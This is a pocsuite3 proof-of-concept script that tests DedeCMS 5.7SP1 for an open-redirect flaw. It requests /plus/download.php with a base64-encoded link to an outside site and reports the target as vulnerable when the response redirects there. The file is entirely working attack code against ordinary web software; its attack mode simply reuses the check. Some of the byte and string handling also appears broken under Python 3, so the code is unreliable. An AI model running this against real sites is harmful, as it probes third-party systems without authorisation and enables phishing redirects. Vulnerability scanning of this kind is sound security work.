#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import base64


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''DedeCMS_url-redirect'''
    desc = ''''''
    solution = ''''''
    severity = '''medium'''
    vulType = '''redirect'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''Desdev DedeCMS'''
    appVersion = '''5.7SP1'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        redirect_url = b'http://www.baidu.com/'
        vul_url = make_verify_url(self.url, '/plus/download.php?open=1&link={}'.format(base64.b64encode(redirect_url)), 0)
        resp = requests.get(vul_url, allow_redirects=False, verify=False, timeout=15)
        if resp.status_code in [301, 302] and resp.headers['location'].find(redirect_url) == 0:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
